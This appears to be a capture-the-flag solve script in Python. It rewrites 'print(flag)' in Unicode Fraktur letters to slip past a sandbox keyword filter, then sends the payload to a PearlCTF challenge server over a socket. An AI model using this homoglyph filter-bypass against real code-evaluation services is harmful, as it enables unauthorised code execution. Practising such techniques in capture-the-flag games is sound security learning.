from socket import AF_INET, socket
from ssl import SOCK_STREAM
from string import ascii_lowercase

payload = "print(flag)\n".translate(
    str.maketrans(ascii_lowercase, "𝔞𝔟𝔠𝔡𝔢𝔣𝔤𝔥𝔦𝔧𝔨𝔩𝔪𝔫𝔬𝔭𝔮𝔯𝔰𝔱𝔲𝔳𝔴𝔵𝔶𝔷")
)
print(payload)

s = socket(AF_INET, SOCK_STREAM)
try:
    s.connect(("dyn.ctf.pearlctf.in", 30017))
    print(s.recv(1024).decode("utf-8"))
    s.send(payload.encode())
    print(s.recv(1024).decode("utf-8"))
finally:
    s.close()
